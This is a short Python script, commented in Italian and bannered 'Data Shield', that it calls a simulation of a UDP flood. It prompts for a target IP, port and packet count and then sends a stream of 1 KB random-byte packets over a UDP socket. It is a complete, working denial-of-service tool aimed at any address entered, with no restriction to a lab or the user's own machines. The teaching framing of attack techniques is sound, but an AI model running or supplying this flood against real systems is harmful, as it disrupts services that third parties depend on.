import socket  # Importa il modulo socket per creare e gestire connessioni di rete.
import random  # Importa il modulo random per generare dati casuali.
import time    # Importa il modulo time per gestire le pause tra gli invii di pacchetti.

def generate_random_bytes(size):
    """Genera un pacchetto di byte casuali di una dimensione specificata."""
    return bytes(random.getrandbits(8) for _ in range(size))  # Genera un pacchetto di 'size' byte casuali.

def udp_flood(target_ip, target_port, packet_count):
    """Esegue un attacco UDP flood inviando pacchetti casuali di 1 KB."""
    packet_size = 1024  # Definisce la dimensione del pacchetto in byte, ovvero 1 KB (1024 byte).
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Crea un socket UDP IPv4.
    packet = generate_random_bytes(packet_size)  # Genera un pacchetto di dati casuali.
    print(f"Inizio dell'UDP flood verso {target_ip}:{target_port} con {packet_count} pacchetti da 1 KB.")  # Messaggio di inizio dell'attacco.
    for i in range(packet_count):  # Loop per inviare il numero specificato di pacchetti.
        sock.sendto(packet, (target_ip, target_port))  # Invia il pacchetto al target specificato.
        print(f"Pacchetto {i+1}/{packet_count} inviato.")  # Stampa un messaggio per ogni pacchetto inviato.
        time.sleep(0.01)  # Introduce una breve pausa di 0,01 secondi per evitare il sovraccarico della rete.
    sock.close()  # Chiude il socket.
    print("Attacco completato.")  # Messaggio di fine dell'attacco.

if __name__ == "__main__":  # costrutto speciale che verifica se il file Python viene eseguito come script principale.

    print("\033[92m"
      ''' 
       ____        _          ____  _     _      _     _  
      |  _ \  __ _| |_ __ _  / ___|| |__ (_) ___| | __| | 
      | | | |/ _` | __/ _` | \___ \| '_ \| |/ _ \ |/ _` | 
      | |_| | (_| | || (_| |  ___) | | | | |  __/ | (_| | 
      |____/ \__,_|\__\__,_| |____/|_| |_|_|\___|_|\____| 
      
      Simulazione di un flood UDP ovvero l'invio massivo di richieste UDP verso una macchina target
      che è in ascolto su una porta UDP.
      
      '''

      "\033[0m"

    )

    target_ip = input("Inserisci l'IP target: ")  # Chiede all'utente di inserire l'indirizzo IP del target.
    target_port = int(input("Inserisci la porta target: "))  # Chiede all'utente di inserire il numero della porta del target e lo converte in un intero.
    packet_count = int(input("Inserisci il numero di pacchetti da inviare: "))  # Chiede all'utente quanti pacchetti inviare e lo converte in un intero.

    udp_flood(target_ip, target_port, packet_count)  # Esegue la funzione udp_flood con i parametri forniti dall'utente.